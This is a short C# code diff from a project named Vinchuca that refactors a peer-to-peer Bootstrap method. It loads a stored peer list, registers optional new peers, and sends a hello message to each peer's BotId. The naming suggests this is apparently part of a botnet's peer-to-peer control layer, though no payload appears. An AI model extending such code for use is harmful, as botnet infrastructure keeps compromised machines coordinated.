@@ -186,12 +186,20 @@ namespace Vinchuca
             }
         }
 
-        public void Bootstrap(List<PeerInfo> peers)
+        public void Bootstrap(List<PeerInfo> peers=null)
         {
-            Logger.Info("Bootstrapping init.  {0} found endpoints", peers.Count);
-            foreach (var peer in peers)
+            _peerList.Load();
+            if (peers != null)
             {
-                _peerList.TryRegister(peer);
+                foreach (var peer in peers)
+                {
+                    _peerList.TryRegister(peer);
+                }
+            }
+
+            Logger.Info("Bootstrapping init.  {0} found endpoints", _peerList.GetPeersEndPoint().Count);
+            foreach (var peer in _peerList)
+            {
                 var hello = new HelloSynMessage();
                 _messagesManager.Send(hello, peer.BotId);
             }
